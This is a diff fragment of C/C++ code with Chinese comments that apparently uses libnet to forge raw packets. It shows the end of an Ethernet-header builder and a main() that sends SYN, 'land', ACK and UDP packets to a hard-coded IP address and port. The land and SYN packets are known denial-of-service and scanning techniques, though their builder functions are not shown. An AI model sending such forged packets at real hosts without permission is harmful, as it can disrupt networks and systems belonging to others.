+        src_mac, /* 以太网源地址 */
+        ETHERTYPE_IP, /* 以太网上层协议类型，此时为IP类型 */
+        NULL, /* 负载，这里为空 */
+        0, /* 负载大小 */
+        handle, /* Libnet句柄 */
+        0 /* 协议块标记，0表示构造一个新的 */
+    );
+    if (eth_tag == -1) {
+        printf("libnet_build_ethernet failure\n");
+        return (-5);
+    };
+
+    packet_size = libnet_write(handle); /* 发送已经构造的数据包*/
+
+    libnet_destroy(handle); /* 释放句柄 */
+
+    return (0);
+}
+
+int main()
+{
+	string dev = "ens33";
+	string dst_ip_s = "125.216.249.125";
+	int port = 1234;
+	construct_SYN_TCP(dev,dst_ip_s,port);
+	//send(dev,dst_ip_s);
+	construct_land_TCP(dev,dst_ip_s,port);
+	construct_ack_TCP(dev,dst_ip_s,port);
+	construct_UDP(dev,dst_ip_s,port);
+
+	return 0;
+}
+
+//#endif
